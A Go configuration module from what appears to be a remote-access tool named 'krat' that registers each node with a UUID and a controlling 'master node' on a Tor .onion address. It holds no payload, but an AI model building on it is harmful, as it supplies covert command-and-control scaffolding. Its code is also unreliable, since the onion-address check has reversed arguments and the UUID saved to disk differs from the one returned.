package config

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/humbertovnavarro/krat/pkg/fs"
	"github.com/joho/godotenv"
)

var NodeUUID string
var userConfigDir, _ = os.UserConfigDir()
var UserDir = fmt.Sprintf("%s/tshell", userConfigDir)
var MasterNode string
var Debug bool = true

func init() {
	godotenv.Load()
	fetchNodeUUID()
	err := os.MkdirAll(UserDir, os.ModePerm)
	if err != nil {
		panic(err)
	}
	if MasterNode == "" {
		MasterNode = os.Getenv("MASTER_NODE")
	}
	// Skip master check in debug mode
	if os.Getenv("DEBUG") != "" {
		return
	}
	if !strings.HasPrefix(".onion", MasterNode) {
		panic("config: master node is an invalid onion address")
	}
	if MasterNode == "" {
		panic("config: master node not configured")
	}
	Debug = os.Getenv("DEBUG") != ""
}

func fetchNodeUUID() string {
	if NodeUUID != "" {
		return NodeUUID
	}
	uuidFilePath := fmt.Sprintf("%s/%s", UserDir, "uuid")
	exists, _ := fs.Exists(uuidFilePath)
	if exists {
		fileData, err := ioutil.ReadFile(uuidFilePath)
		if err != nil {
			panic(err)
		}
		NodeUUID = string(fileData)
		return string(fileData)
	}
	f, err := os.Create(uuidFilePath)
	if err != nil {
		panic(err)
	}
	_nodeUUID := uuid.NewString()
	NodeUUID = _nodeUUID
	f.WriteString(uuid.NewString())
	f.Close()
	return _nodeUUID
}
